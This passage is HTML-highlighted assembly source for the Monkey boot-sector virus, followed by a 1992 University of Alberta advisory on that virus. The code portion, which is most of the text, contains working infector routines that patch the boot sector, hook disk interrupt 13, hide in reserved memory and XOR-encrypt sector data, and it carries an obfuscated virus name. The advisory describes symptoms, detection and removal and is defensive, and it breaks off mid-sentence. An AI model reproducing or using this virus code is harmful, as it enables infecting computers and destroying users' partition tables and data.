</span><span class="sc5">COMP_SIG</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PROG_SIG</span><span class="sc4">],</span><span class="sc2">9219H</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">COMP_SIG</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">COMP_PA</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">119H</span><span class="sc4">],</span><span class="sc2">6150H</span><span class="sc0">   </span><span class="sc1">; PA?</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">COMP_PA</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">HOME_SEC</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">01H</span><span class="sc0">

</span><span class="sc5">FLOPPY_HEAD</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">01H</span><span class="sc4">,</span><span class="sc2">01H</span><span class="sc0">
</span><span class="sc5">HARD_HEAD</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc0">

                  </span><span class="sc1">;  360 720 1.2 1.44</span><span class="sc0">
</span><span class="sc5">FLOP_SECT_TABLE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">02H</span><span class="sc4">,</span><span class="sc2">05H</span><span class="sc4">,</span><span class="sc2">09H</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc0">
</span><span class="sc5">SAVE_SECT_TABLE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">03H</span><span class="sc4">,</span><span class="sc2">05H</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">

</span><span class="sc5">CHSEC</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004H</span><span class="sc0">
</span><span class="sc5">CHSEC_1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">FLOP_SECT_TABLE</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">CHSEC_END_1</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">CHSEC_1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">03H</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">CHSEC_END_2</span><span class="sc0">
</span><span class="sc5">CHSEC_END_1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">SAVE_SECT_TABLE</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CHSEC_END_2</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">CHSEC</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">SHIFT_NORMAL</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
 </span><span class="sc1">; FIND THE SEGMENT TO HIDE</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">413H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">SHIFT_SPECIAL</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">06H</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">SHIFT_NORMAL</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">PATCH</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">         </span><span class="sc1">; PATCH ON BOOT SECTOR STARTING AT BYTE int_13</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_13</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc1">;   CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PROG_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_13</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">

</span><span class="sc5">PATCH_JMP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

    </span><span class="sc6">SUB</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">3H</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">PATCH</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">SET_HEAD</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FLOPPY_HEAD</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">SET_HEAD_EXIT</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HARD_HEAD</span><span class="sc0">
</span><span class="sc5">SET_HEAD_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">SET_HEAD</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">INITIAL</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">CLI</span><span class="sc0">
      </span><span class="sc6">SUB</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
      </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
      </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
      </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">
      </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">HOOK</span><span class="sc0">
      </span><span class="sc6">NOP</span><span class="sc0">
      </span><span class="sc6">NOP</span><span class="sc0">

</span><span class="sc5">ENCRPT_PBR</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">

      </span><span class="sc6">CLD</span><span class="sc0">
</span><span class="sc5">ENCRPT_1</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ENCRPT_CODE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0001H</span><span class="sc0">
      </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2EH</span><span class="sc0">
      </span><span class="sc6">STOSB</span><span class="sc0">
      </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">ENCRPT_1</span><span class="sc0">

      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
      </span><span class="sc6">RET</span><span class="sc0">


             </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">01F4H</span><span class="sc0">
</span><span class="sc1">;PROG_NAME   DB     "Monkey"</span><span class="sc0">
</span><span class="sc5">PROG_NAME</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">8fh</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc0">

             </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">01FAH</span><span class="sc0">
</span><span class="sc5">PROG_SIG</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">19H</span><span class="sc4">,</span><span class="sc2">92H</span><span class="sc0">

</span><span class="sc5">PROG_END</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">   </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">

            </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">01FCH</span><span class="sc0">
</span><span class="sc5">INT13_ADDR</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc0">

            </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">01FEH</span><span class="sc0">
</span><span class="sc5">BOOT_SIG</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">55H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc0">
</span><span class="sc5">PROG_TAIL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">   </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">

</span><span class="sc5">PROG_LEN</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">   </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PROG_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_13</span><span class="sc0">


</span><span class="sc5">CODE</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">
      </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">MAIN</span><span class="sc0">

</span><span class="sc1">; from U of A</span><span class="sc0">
</span><span class="sc5">NEW</span><span class="sc0"> </span><span class="sc5">COMPUTER</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc5">THREAT</span><span class="sc0">                   </span><span class="sc5">Posted</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">July</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1992</span><span class="sc0">

</span><span class="sc5">MONKEY</span><span class="sc0"> </span><span class="sc5">VIRUSES</span><span class="sc0"> </span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc5">PCs</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc9">record</span><span class="sc4">/</span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">infectors</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">derived</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Empire</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">virus.</span><span class="sc0"> </span><span class="sc5">Two</span><span class="sc0"> </span><span class="sc5">variants</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">identified.</span><span class="sc0"> </span><span class="sc5">Of</span><span class="sc0"> </span><span class="sc5">particular</span><span class="sc0"> </span><span class="sc5">concern</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">fact</span><span class="sc0"> </span><span class="sc5">these</span><span class="sc0">
</span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc5">computers</span><span class="sc0"> </span><span class="sc5">protected</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc9">while</span><span class="sc0"> </span><span class="sc5">causing</span><span class="sc0"> </span><span class="sc5">no</span><span class="sc0"> </span><span class="sc5">noticeable</span><span class="sc0"> </span><span class="sc5">changes.</span><span class="sc0"> </span><span class="sc5">Symptoms</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0">
</span><span class="sc5">those</span><span class="sc0"> </span><span class="sc5">computers</span><span class="sc0"> </span><span class="sc5">without</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">reduction</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">
</span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">partitions</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">accessible</span><span class="sc0"> </span><span class="sc5">when</span><span class="sc0"> </span><span class="sc5">booting</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0">
</span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">floppy</span><span class="sc0"> </span><span class="sc5">disk.</span><span class="sc0"> </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">active</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">computers</span><span class="sc0">
</span><span class="sc5">without</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">reduced</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">024</span><span class="sc0"> </span><span class="sc5">bytes.</span><span class="sc0">

</span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">destroy</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">data.</span><span class="sc0"> </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0">
</span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">claims</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">unable</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
</span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">partitions.</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">DIR</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Invalid drive specification."</span><span class="sc0">

</span><span class="sc5">Detection</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">simplest</span><span class="sc0"> </span><span class="sc5">method</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">detection</span><span class="sc0"> </span><span class="sc5">involves</span><span class="sc0"> </span><span class="sc5">recognizing</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc2">1K</span><span class="sc0">
</span><span class="sc5">decrease</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">memory.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">commands</span><span class="sc0"> </span><span class="sc5">CHKDSK</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">MEM</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc2">1K</span><span class="sc0">
</span><span class="sc5">less</span><span class="sc0"> </span><span class="sc3">"total conventional memory"</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">normal.</span><span class="sc0">

</span><span class="sc5">Of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">popular</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">scanning</span><span class="sc0"> </span><span class="sc5">products</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc2">2.04A</span><span class="sc0">
</span><span class="sc5">finds</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">calling</span><span class="sc0"> </span><span class="sc5">them</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc3">"New variant of Stoned."</span><span class="sc0">
</span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">identify</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">well.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc5">Virstop</span><span class="sc0">
</span><span class="sc5">driver</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">recognize</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc4">-</span><span class="sc5">up.</span><span class="sc0">

</span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc2">1.15a</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ds115a.zip</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CHKSEC</span><span class="sc0">
</span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">notice</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">presence</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses.</span><span class="sc0"> </span><span class="sc5">Note</span><span class="sc0">
</span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">itself</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">detect</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
</span><span class="sc5">important</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CHKSEC</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">called</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">autoexec.bat</span><span class="sc0">
</span><span class="sc5">file.</span><span class="sc0">

</span><span class="sc5">As</span><span class="sc0"> </span><span class="sc5">well</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">special</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">called</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">written</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">University</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Alberta.</span><span class="sc0">

</span><span class="sc5">Removal</span><span class="sc0">

</span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">previously</span><span class="sc0"> </span><span class="sc5">saved</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">copy</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc9">record</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">MBR</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">restored.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Many</span><span class="sc0">
